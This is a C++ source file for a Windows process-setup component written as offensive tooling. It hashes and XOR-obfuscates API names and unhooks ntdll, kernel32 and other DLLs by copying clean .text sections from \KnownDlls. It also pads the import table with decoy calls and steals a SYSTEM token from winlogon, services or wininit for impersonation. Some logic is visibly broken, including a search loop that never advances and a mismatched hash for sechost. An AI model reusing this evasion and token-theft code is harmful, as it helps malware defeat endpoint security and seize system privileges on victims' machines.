#include "ProcessInit.hpp"
#include "Console.hpp"
#include "HasherLibrary.hpp"
#include "XorStr.hpp"


#include <vector>
#include <iostream>
#include <ShlObj_core.h>
#include <random>
#include <time.h>
#include <locale> 


bool ProcessInit::Init()
{
	CPrint(xorstr_("Process Setup"), xorstr_("Process Init"))
	

	this->ntdllHash = HASHSTRW(xorstr_(L"ntdll.dll"));
	this->kernel32Hash = HASHSTRW(xorstr_(L"KERNEL32.DLL"));
	this->kernelbaseHash = HASHSTRW(xorstr_(L"KERNELBASE.dll"));
	this->advapiHash = HASHSTRW(xorstr_(L"ADVAPI32.dll"));
	this->ucrtHash = HASHSTRW(xorstr_(L"ucrtbase.dll"));
	this->user32Hash = HASHSTRW(xorstr_(L"USER32.dll"));
	this->sechostHash = HASHSTRW(xorstr_(L"sechost.dll"));
	this->imm32Hash = HASHSTRW(xorstr_(L"IMM32.DLL"));

		
	this->ntdllhashedNames.ntOpenSectionHash = HASHSTRA(xorstr_("NtOpenSection"));
	this->ntdllhashedNames.ntOpenProcessHash = HASHSTRA(xorstr_("NtOpenProcess"));
	this->ntdllhashedNames.ntAllocateVirtualMemoryHash = HASHSTRA(xorstr_("NtAllocateVirtualMemory"));
	this->ntdllhashedNames.ntFreeVirtualMemoryHash = HASHSTRA(xorstr_("NtFreeVirtualMemory"));
	this->ntdllhashedNames.ntOpenProcessTokenHash = HASHSTRA(xorstr_("NtOpenProcessToken"));
	this->ntdllhashedNames.ntDuplicateTokenHash = HASHSTRA(xorstr_("NtDuplicateToken"));
	this->ntdllhashedNames.ntSetInformationThreadHash = HASHSTRA(xorstr_("NtSetInformationThread"));
	this->ntdllhashedNames.ntOpenFileHash = HASHSTRA(xorstr_("NtOpenFile"));
	this->ntdllhashedNames.ntCloseHash = HASHSTRA(xorstr_("NtClose"));
	this->kernel32hashedNames.MapViewOfFileHash = HASHSTRA(xorstr_("MapViewOfFile")); 
	this->kernel32hashedNames.UnmapViewOfFileHash = HASHSTRA(xorstr_("UnmapViewOfFile"));
	this->kernel32hashedNames.setConsoleTitleAHash = HASHSTRA(xorstr_("SetConsoleTitleA"));
	this->kernel32hashedNames.VirtualProtectHash = HASHSTRA(xorstr_("VirtualProtect"));
	this->kernel32hashedNames.CreateFileMappingWHash = HASHSTRA(xorstr_("CreateFileMappingW"));
	this->kernel32hashedNames.ProcessSnapshotHash = HASHSTRA(xorstr_("CreateToolhelp32Snapshot"));
	this->kernel32hashedNames.Process32NextWHash = HASHSTRA(xorstr_("Process32NextW"));
	this->kernel32hashedNames.Process32FirstWHash = HASHSTRA(xorstr_("Process32FirstW"));
	this->AdjustTokenPrivilegesHash = HASHSTRA(xorstr_("AdjustTokenPrivileges"));
	

	this->winlogonHash = HASHSTRW(xorstr_(L"winlogon.exe"));
	this->servicesHash = HASHSTRW(xorstr_(L"services.exe"));
	this->wininitHash = HASHSTRW(xorstr_(L"wininit.exe"));
	
	
	
	CAppendedPrint(xorstr_("Process Setup"), xorstr_("Fetching Dll Information..."))
	if (!Dll_Info())
	{
		CPrintError(xorstr_("Process Setup"), xorstr_("Process Initialization Failed Due To Invalid dll Information"))
		return false;
	}
	else
	{
		std::cout << xorstr_("Successful\n");
		this->FetchFunctionPtrsUtil();
	}

	if (!this->Window_Title())
	{
		CPrintError(xorstr_("Process Setup"), xorstr_("Process Initialization Failed Due To Invalid Title Change"))
		return false;
	}


	CPrint(xorstr_("Process Setup"), xorstr_("Unhooking Dlls..."));
	
	int dll_Count = 0;
	do
	{
		
		if (!this->UnHook_Dlls(dll_Count))
		{
			CAppendedPrintError(xorstr_("Process Setup"), xorstr_("Process Initialization Failed Due To Invalid Dll Unhook"))
			return false;
		}
		
		dll_Count++;
	} while (dll_Count < DLL_COUNT);

	
	CPrint(xorstr_("Process Setup"), xorstr_("Successful, Unhooked All Dlls"));

	if (!this->Hijack_token())
	{
		CPrintError(xorstr_("Process Setup"), xorstr_("Process Initialization Failed Due To Invalid Token Hijack"))
		return false;
	}

	CPrint(xorstr_("Process Setup"), xorstr_("Process Initialization Complete"));

	return true;
}



namespace RandNum
{
	char CHARSET[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";

	static std::default_random_engine random{ static_cast<unsigned>(time(0)) };
	static std::mt19937 random_generator(random());

	static int Rand()
	{
#pragma warning( push )
#pragma warning( disable : 4244)
		srand(time(NULL));
		int i = (rand() % (41 - 15 + 1)) + 15;
#pragma warning( pop ) 
		return i;
	}

	static std::string generate(size_t length)
	{

		std::string str = CHARSET;

		while (length > str.length()) str += str;

		std::shuffle(str.begin(), str.end(), random_generator);

		return str.substr(0, length);
	}

}



inline std::string ProcessInit::Filepath_To_Filename(const wchar_t* String)
{
	std::wstring filePathW;
	std::wstring fileNameW;

	filePathW = String;
	fileNameW = filePathW.substr(filePathW.find_last_of(L"\\") + 1);

	std::string fileNameA(fileNameW.begin(), fileNameW.end());

		
	return fileNameA;
}



//////////////////////////////////////////////////////////////////////////////////////////////////
bool ProcessInit::Window_Title()
{
	using namespace RandNum;
	std::string newTitle = generate(Rand());

	
	CAppendedPrint(xorstr_("Process Setup"), xorstr_("Making Random Window Title..."))
	

	auto pSetConsoleTitleA = (fnSetConsoleTitleA)this->Fetch_Function(this->kernel32hashedNames.setConsoleTitleAHash);

	if (!pSetConsoleTitleA(reinterpret_cast<LPCTSTR>(newTitle.c_str())))
	{
		CAppendedPrintErrorCode(xorstr_("Process Setup"), xorstr_("Failed To Change Title With ERROR"), GetLastError());
		return false;
	}

	std::cout << xorstr_("New Title : ") << newTitle.c_str() << "\n";
	newTitle.clear();

	return true;
}


bool ProcessInit::Dll_Info()
{
    auto peb = (PPEB64)__readgsqword(0x60);
    PLDR_DATA_TABLE_ENTRY64 entry = nullptr;
	auto tempDllInfo = std::make_unique<IMAGE_INFO>();


	
	auto pLdr = peb->Ldr;
	if (!pLdr)
	{
		CPrintError(xorstr_("Process Setup"), xorstr_("Failed To Fetch Peb"))
		return false;
	}
    
	auto ldrEntry = (PLDR_DATA_TABLE_ENTRY64)pLdr->InMemoryOrderModuleList.Flink;
	if (!ldrEntry)
	{
		CPrintError(xorstr_("Process Setup"), xorstr_("Failed To Fetch Ldr Entry"))
		return false;
	}

    do
    {
		if (ldrEntry->BaseDllName.Buffer == nullptr) break;		
		else
		{
			entry = CONTAINING_RECORD(ldrEntry, LDR_DATA_TABLE_ENTRY64, InMemoryOrderLinks);
		}
		

		tempDllInfo.get()->baseAddr = entry->DllBase;
		tempDllInfo.get()->hashedName = Rsh.Hash_String(entry->BaseDllName.Buffer);
        this->imageInfo.push_back(*tempDllInfo.get());
     
        ldrEntry = *(PLDR_DATA_TABLE_ENTRY64*)(ldrEntry);

    } while (ldrEntry);

	

	return true;
}




void* ProcessInit::Function_Addr(__in std::uint32_t hashedModuleName, __in std::uint32_t hashedProcName)
{
	
	auto pBase = (PBYTE)Retrive_DllBase(hashedModuleName);
	

    auto dos_Header = (PIMAGE_DOS_HEADER)pBase;
    if (dos_Header->e_magic != IMAGE_DOS_SIGNATURE)
    {
		CPrintError(xorstr_("Process Setup"), xorstr_("Failed DOS Signature Check"))
		return nullptr;
    }

    auto nt_Header = (PIMAGE_NT_HEADERS64)(pBase + dos_Header->e_lfanew);
    if (nt_Header->Signature != IMAGE_NT_SIGNATURE)
    {
		CPrintError(xorstr_("Process Setup"), xorstr_("Failed NT Signature Check"))
		return nullptr;
    }

    if ((nt_Header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress) == 0)
    {
		CPrintError(xorstr_("Process Setup"), xorstr_("Failed To Find Image Directory Entry Point"))
		return nullptr;
    }

	auto szExportDir = nt_Header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;

    auto exportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + nt_Header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	if (!exportDir)
	{
		CPrintError(xorstr_("Process Setup"), xorstr_("Failed To Fetch Export Directory"))
		return nullptr;
	}
	


    auto  nameArray = (PDWORD)(pBase + exportDir->AddressOfNames);
    auto  ordinal = (PWORD)(pBase + exportDir->AddressOfNameOrdinals);
    auto  addressArray = (PDWORD)(pBase + exportDir->AddressOfFunctions);

    for (DWORD i = 0; i < exportDir->NumberOfNames; i++)
    {
        auto name = (char*)(pBase + nameArray[i]);
		auto pFunctionAddress = (void*)(pBase + addressArray[ordinal[i]]);
        

		if(name &&
        Rsh.String_cmp(hashedProcName, name) == true)
        {
			return pFunctionAddress;   
        }
    }

	CPrintError(xorstr_("Process Setup"), xorstr_("Failed To Find Function Address"));
    return nullptr;
}




void* ProcessInit::Retrive_DllBase(__in std::uint32_t hashedModule)
{
	
	for (auto &it : this->imageInfo)
    {
        if (Rsh.Hash_Compare(it.hashedName, hashedModule))
        {
            return it.baseAddr;
        }
    }
   
    return nullptr;
}




void ProcessInit::Map_Dll(__out void** pBuffer, __in wchar_t* Knowndll)
{

	HANDLE			   hSection = nullptr;
	ULONG					result = 1;
	LPVOID			  dllBuffer = nullptr;
	
	auto uniStr = std::make_unique<UNICODE_STRING>(0);
	auto objAtr = std::make_unique<OBJECT_ATTRIBUTES>(0);


	InitializeUnicodeString(uniStr.get(), Knowndll);
	InitializeObjectAttributes(objAtr.get(), uniStr.get(), OBJ_CASE_INSENSITIVE, nullptr, nullptr);

	
	auto pNtOpenSection = (fnNtOpenSection)this->Fetch_Function(this->ntdllhashedNames.ntOpenSectionHash);
	if (!NT_SUCCESS(result = pNtOpenSection(&hSection, SECTION_MAP_READ, objAtr.get())))
	{
		CPrintErrorCode(xorstr_("Process Setup"), xorstr_("NtOpenSectionFailed With ERROR"), result)
		return;
	}

	auto pMapViewOfFile = (fnMapViewOfFile)this->Fetch_Function(this->kernel32hashedNames.MapViewOfFileHash);
	dllBuffer = pMapViewOfFile(hSection, FILE_MAP_READ, NULL, NULL, NULL);
	if (!dllBuffer)
	{
		CPrintErrorCode(xorstr_("Process Setup"), xorstr_("MapViewOfFile Failed With ERROR"), GetLastError())
			return;
	}

	*pBuffer = dllBuffer;



	CloseHandle(hSection);
}




bool ProcessInit::Text_Section_Swap(__in wchar_t* remoteDllName, __in std::uint32_t hashedModuleName)
{

	std::size_t			 szText = 0;
	void* remoteDll = nullptr;
	void* localTextSection = nullptr;
	void* remoteTextSection = nullptr;
	NTSTATUS			   status = 1;


	auto localDll = Retrive_DllBase(hashedModuleName);
	if (!localDll)
	{
		CPrintError(xorstr_("Process Setup"), xorstr_("Failed To Fetch Image Base Of Local Dll"))
			return false;
	}
	auto dos_Header = (PIMAGE_DOS_HEADER)localDll;
	if (dos_Header->e_magic != IMAGE_DOS_SIGNATURE)
	{
		CPrintError(xorstr_("Process Setup"), xorstr_("Local Dll Failed NT Signature Check"))
			return false;
	}

	auto nt_Header = (PIMAGE_NT_HEADERS)((LPBYTE)localDll + dos_Header->e_lfanew);
	if (nt_Header->Signature != IMAGE_NT_SIGNATURE)
	{
		CPrintError(xorstr_("Process Setup"), xorstr_("Local Dll Failed NT Signature Check"))
			return false;
	}


	this->Map_Dll(&remoteDll, remoteDllName);


	if (!remoteDll)
	{
		CPrintError(xorstr_("Process Setup"), xorstr_("Failed To Fetch Remote Dll"))
			return false;
	}


	auto section_Header = IMAGE_FIRST_SECTION(nt_Header);
	if (!section_Header)
	{
		CPrintError(xorstr_("Process Setup"), xorstr_("Failed To Get First Section"))
			return false;
	}
	for (int i = 0; i < nt_Header->FileHeader.NumberOfSections; i++)
	{
		if ((*(PULONG)section_Header[i].Name | 0x20202020) == 'xet.')
		{
			localTextSection = C_PTR(((ULONG_PTR)localDll + section_Header[i].VirtualAddress));
			remoteTextSection = C_PTR(((ULONG_PTR)remoteDll + section_Header[i].VirtualAddress));
			szText = section_Header[i].Misc.VirtualSize;
			break;
		}
	}


	if (!localTextSection || !remoteTextSection || szText == 0)
	{
		CPrintError(xorstr_("Process Setup"), xorstr_("One Or More Of The Text Sections Are NULL"));
		return false;
	}



	DWORD dwOldProtect = 0;
	
	auto pVirtualProtect = (fnVirtualProtect)this->Fetch_Function(this->kernel32hashedNames.VirtualProtectHash);
	if (!pVirtualProtect(localTextSection, szText, PAGE_EXECUTE_WRITECOPY, &dwOldProtect))
	{
		CPrintErrorCode(xorstr_("Process Setup"), xorstr_("NtProtectVirtualMemory Call 1 Failed With ERROR"), status)
			return false;
	}

	auto pNtAllocateVirtualMemory = (fnNtAllocateVirtualMemory)this->Fetch_Function(this->ntdllhashedNames.ntAllocateVirtualMemoryHash);
	auto sectionInfo = HOOKED_TEXT{ nullptr };
	void* oldTextBuffer = nullptr;

	
	if (!NT_SUCCESS(status = pNtAllocateVirtualMemory(NtCurrentProcess(), &oldTextBuffer, 0, &szText, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)))
	{
		CAppendedPrintErrorCode(xorstr_("Process Setup"), xorstr_("NtAllocateVirtualMemory Failed With ERROR"), U_PTR(status))

		
		return false;
	}

	sectionInfo.allocPtr = oldTextBuffer;
	sectionInfo.sztextSection = szText;
	sectionInfo.textSectionPtr = localTextSection;

	this->oldTextScetions.push_back(sectionInfo);
	
	std::memcpy(oldTextBuffer, localTextSection, szText);
	std::memcpy(localTextSection, remoteTextSection, szText);

	
	if (!pVirtualProtect(localTextSection, szText, PAGE_EXECUTE_WRITECOPY, &dwOldProtect))
	{
		CPrintErrorCode(xorstr_("Process Setup"), xorstr_("NtProtectVirtualMemory Call 2 Failed With ERROR"), status)
			return false;
	}

	auto pUnmapViewOfFile = (fnUnmapViewOfFile)this->Fetch_Function(this->kernel32hashedNames.UnmapViewOfFileHash);
	pUnmapViewOfFile(remoteDll);
	
	std::wstring conv;
	std::string dllName;
	
	dllName = this->Filepath_To_Filename(remoteDllName);
	std::cout << dye.green << xorstr_("[-]") << dye.reset << xorstr_("Unhooked : ") << dllName << xorstr_(", New Text Section At : 0x") << std::uppercase << std::hex << remoteTextSection << std::endl;

	conv.clear();
	dllName.clear();

	return true;
}



bool ProcessInit::UnHook_Dlls(__in int name)
{

	switch (name)
	{
	case 0:
		if (!this->Text_Section_Swap(xorstr_(L"\\KnownDlls\\ntdll.dll"), this->ntdllHash)) return false;
		break;
	case 1:
		if (!this->Text_Section_Swap(xorstr_(L"\\KnownDlls\\kernelbase.dll"), this->kernelbaseHash)) return false;
		break;
	case 2:
		if (!this->Text_Section_Swap(xorstr_(L"\\KnownDlls\\kernel32.dll"), this->kernel32Hash)) return false;
		break;
	case 3:
		if (!this->Text_Section_Swap(xorstr_(L"\\KnownDlls\\advapi32.dll"), this->advapiHash)) return false;
		break;
	case 4:
		if (!this->Text_Section_Swap(xorstr_(L"\\KnownDlls\\ucrtbase.dll"), this->ucrtHash)) return false;
		break;
	case 5:	
		if (!this->Text_Section_Swap(xorstr_(L"\\KnownDlls\\user32.dll"), this->user32Hash)) return false;
		break;
	case 6:
		if (!this->Text_Section_Swap(xorstr_(L"\\KnownDlls\\sechost.dll"), this->user32Hash))	return false;
		break;
	case 7:
		if (!this->Text_Section_Swap(xorstr_(L"\\KnownDlls\\IMM32.dll"), this->imm32Hash)) return false;
		break;
	default:
		break;
	}


	return true;
}




/// <summary>
/// Adding benign functions For IAT
/// </summary>
void ProcessInit::IatCamouflage()
{
	auto A = 400;

	if (A > 350)
	{
		unsigned __int64
			i = GetLastError();
		i = GetWindowContextHelpId(NULL);
		i = GetWindowLongPtrW(NULL, NULL);
		i = IsWindowVisible(NULL);
		i = ConvertDefaultLocale(NULL);
		i = MultiByteToWideChar(NULL, NULL, NULL, NULL, NULL, NULL);
		i = IsDialogMessageW(NULL, NULL);
		i = AbortSystemShutdownW(NULL);
	}


}


void* ProcessInit::Fetch_Process_By_Name(const std::uint32_t processNameHash)
{
	HANDLE result = nullptr;

	auto pCreateToolhelp32Snapshot = (fnCreateToolhelp32Snapshot)this->Fetch_Function(this->kernel32hashedNames.ProcessSnapshotHash);
	auto pProcess32NextW = (fnProcess32NextW)this->Fetch_Function(this->kernel32hashedNames.Process32NextWHash);
	auto pProcess32FirstW = (fnProcess32FirstW)this->Fetch_Function(this->kernel32hashedNames.Process32FirstWHash);

	
	HANDLE hSnapShot = pCreateToolhelp32Snapshot(0x00000002, 0);

	if (hSnapShot == INVALID_HANDLE_VALUE)
	{
		CPrintError(xorstr_("Process Setup"), xorstr_("Failed To Fetch Handle To Process SnapShot"))
		if (hSnapShot) CloseHandle(hSnapShot);	
		return nullptr;
	}

	auto processEntry = std::make_unique<PROCESSENTRY32W>();

	processEntry.get()->dwSize = sizeof(PROCESSENTRY32W);

	if (!pProcess32FirstW(hSnapShot, processEntry.get()))
	{
		CPrintError(xorstr_("Process Setup"), xorstr_("Failed To Fetch Initial Process Entry"))
		goto cleanup;
	}
	
	do
	{
		if (Rsh.String_cmp(processNameHash, processEntry.get()->szExeFile))
		{
			return C_PTR(processEntry.get()->th32ProcessID);
		}

	} while (pProcess32NextW(hSnapShot, processEntry.get()));

cleanup:
	CloseHandle(hSnapShot);
	return nullptr;
}




bool ProcessInit::Hijack_token()
{
	CAppendedPrint(xorstr_("Process Setup"), xorstr_("Fetching Elevated Process..."))

	auto ID = std::make_unique<CLIENT_ID>();
	NTSTATUS status = 1;

	auto findProc = 0;	
	while (findProc < 3)
	{
		if (findProc == 0) 
		{
			ID.get()->UniqueProcess = this->Fetch_Process_By_Name(this->winlogonHash);
			if (ID.get()->UniqueProcess)
			{
				std::cout << xorstr_("Found Winlogon.exe\n");
				break;
			}
		}
		if (findProc == 1)
		{
			ID.get()->UniqueProcess = this->Fetch_Process_By_Name(this->servicesHash);
			if (ID.get()->UniqueProcess)
			{
				std::cout << xorstr_("Found Services.exe\n");
				break;
			}
		}
		if (findProc == 2)
		{
			ID.get()->UniqueProcess = this->Fetch_Process_By_Name(this->wininitHash);
			if (ID.get()->UniqueProcess)
			{
				std::cout << xorstr_("Found Wininit.exe\n");
				break;
			}
		}

		
	}

	CAppendedPrint(xorstr_("Process Setup"), xorstr_("Fetching Process Handle..."))

	HANDLE procHandle = nullptr;
	HANDLE hToken = nullptr;
	auto winlAtts = std::make_unique<OBJECT_ATTRIBUTES>(0);

	auto pNtCLose = (fnNtCLose)this->Fetch_Function(this->ntdllhashedNames.ntCloseHash);
	
	
	auto pNtOpenProcess = (fnNtOpenProcess)this->Fetch_Function(this->ntdllhashedNames.ntOpenProcessHash);
	if(!NT_SUCCESS(status = pNtOpenProcess(&procHandle, PROCESS_QUERY_LIMITED_INFORMATION, winlAtts.get(), ID.get())))
	{
		CAppendedPrintErrorCode(xorstr_("Process Setup"), xorstr_("Failed To Open Process With ERROR"), status)
		if (procHandle)pNtCLose(procHandle);
		return false;
	}

	CPrintBland(xorstr_("Successful"))

	CAppendedPrint(xorstr_("Process Setup"), xorstr_("Opening Token..."))

	auto pNtOpenProcessToken = (fnNtOpenProcessToken)this->Fetch_Function(this->ntdllhashedNames.ntOpenProcessTokenHash);
	if (!NT_SUCCESS(status = pNtOpenProcessToken(procHandle, TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE, &hToken)))
	{
		CAppendedPrintErrorCode(xorstr_("Process Setup"), xorstr_("Failed To Open Token With ERROR"), status)

		if (procHandle)pNtCLose(procHandle);
		if (hToken)pNtCLose(hToken);
		return false;
	}

	CPrintBland(xorstr_("Successful"))
	auto classt = std::make_unique<THREADINFOCLASS>();
	
	auto Qos = std::make_unique<SECURITY_QUALITY_OF_SERVICE>();
	Qos.get()->ContextTrackingMode = 1; 
	Qos.get()->EffectiveOnly = false;
	Qos.get()->Length = sizeof(SECURITY_QUALITY_OF_SERVICE);
	Qos.get()->ImpersonationLevel = SecurityImpersonation;
	
	
	auto objAtts = std::make_unique<OBJECT_ATTRIBUTES>(0);
	objAtts.get()->Length = sizeof(OBJECT_ATTRIBUTES);
	objAtts.get()->SecurityQualityOfService = Qos.get();

	HANDLE duphToken = nullptr;

	CAppendedPrint(xorstr_("Process Setup"), xorstr_("Duplicating Token..."))

	auto pNtDuplicateToken = (fnNtDuplicateToken)this->Fetch_Function(this->ntdllhashedNames.ntDuplicateTokenHash);

	if (!NT_SUCCESS(status = pNtDuplicateToken(hToken, MAXIMUM_ALLOWED, objAtts.get(), SecurityImpersonation, TokenImpersonation, &duphToken)))
	{
		CAppendedPrintErrorCode(xorstr_("Process Setup"), xorstr_("Failed To Duplicate Token With ERROR"), status)
		if (procHandle)pNtCLose(procHandle);
		if (hToken)pNtCLose(hToken);
		return false;
	}

	CPrintBland(xorstr_("Successful"))

	CAppendedPrint(xorstr_("Process Setup"), xorstr_("Applying Duplicated Token..."))
	
	auto pNtSetInformationThread = (fnNtSetInformationThread)this->Fetch_Function(this->ntdllhashedNames.ntSetInformationThreadHash);

	if (!NT_SUCCESS(status = pNtSetInformationThread(((HANDLE)-2), THREADINFOCLASS(ThreadImpersonationToken), &duphToken, 0x08)))
	{
		CAppendedPrintErrorCode(xorstr_("Process Setup"), xorstr_("Failed To Apply Token With ERROR"), status)
		if (procHandle)pNtCLose(procHandle);
		if (hToken)pNtCLose(hToken);
		return false;
	}
	
	std::cout << xorstr_("Successful\n");

	
	if (procHandle)pNtCLose(procHandle);
	if (hToken)pNtCLose(hToken);
	return true;
}




/// <summary>
/// all structure variables must be the same
/// </summary>
template <typename S> std::uint32_t* GetBegin(S* structure)
{
	return (std::uint32_t*)(std::uint32_t*)structure;
}

template <typename S> std::uint32_t* GetEnd(S* structure)
{	
	auto varCount = (sizeof(*structure) / sizeof(std::uint32_t)) -1;
	return (std::uint32_t*)((std::uint32_t*)structure + varCount);
}


bool ProcessInit::FetchFunctionPtrsUtil()
{
	CAppendedPrint(xorstr_("Process Setup"), xorstr_("Fetching All Function Pointer..."))

	auto tempPtrs = FUNCTION_PTRS { nullptr };
	std::uint32_t nonPtr;

	for (auto ptr = GetBegin(&this->ntdllhashedNames); ptr < GetEnd(&this->ntdllhashedNames) + 1; ptr++)
	{
		nonPtr = *ptr;

		tempPtrs.function_Ptr = this->Function_Addr(this->ntdllHash, nonPtr);
		
		if (!tempPtrs.function_Ptr)
		{
			return false;
		}
		
		tempPtrs.hashedName = nonPtr;

		this->functionPointers.push_back(tempPtrs);
		RtlZeroMemory(&tempPtrs, sizeof(FUNCTION_PTRS));
	}

	for (auto ptr = GetBegin(&this->kernel32hashedNames); ptr < GetEnd(&this->kernel32hashedNames) + 1; ptr++)
	{
		nonPtr = *ptr;

		tempPtrs.function_Ptr = this->Function_Addr(this->kernel32Hash, nonPtr);

		if (!tempPtrs.function_Ptr)
		{
			return false;
		}

		tempPtrs.hashedName = nonPtr;

		this->functionPointers.push_back(tempPtrs);
		RtlZeroMemory(&tempPtrs, sizeof(FUNCTION_PTRS));
	}

	tempPtrs.function_Ptr = this->Function_Addr(this->advapiHash, this->AdjustTokenPrivilegesHash);
	if (!tempPtrs.function_Ptr) return false;
	else
		tempPtrs.hashedName = this->AdjustTokenPrivilegesHash;

	this->functionPointers.push_back(tempPtrs);


	CPrintBland(xorstr_("Successful"))
}


void* ProcessInit::Fetch_Function(std::uint32_t hashedName)
{

	for (auto& it : this->functionPointers)
	{
		if (Rsh.Hash_Compare(hashedName, it.hashedName)) return it.function_Ptr;
	}


	return nullptr;
}


void ProcessInit::Cleanup()
{
	
	auto pNtFreeVirtualMemory = (fnNtFreeVirtualMemory)this->Fetch_Function(this->ntdllhashedNames.ntFreeVirtualMemoryHash);


	for (auto& it2 : this->oldTextScetions)
	{
		CPrintWithVariable(xorstr_("Process Setup"), xorstr_("Replacing original Text Section At"), U_PTR(it2.textSectionPtr))

		std::memcpy(it2.textSectionPtr, it2.allocPtr, it2.sztextSection);

		CPrintWithVariable(xorstr_("Process Setup"), xorstr_("Free Memory At"), U_PTR(it2.allocPtr))
		pNtFreeVirtualMemory(NtCurrentProcess(), it2.allocPtr, &it2.sztextSection, MEM_RELEASE);
	}
}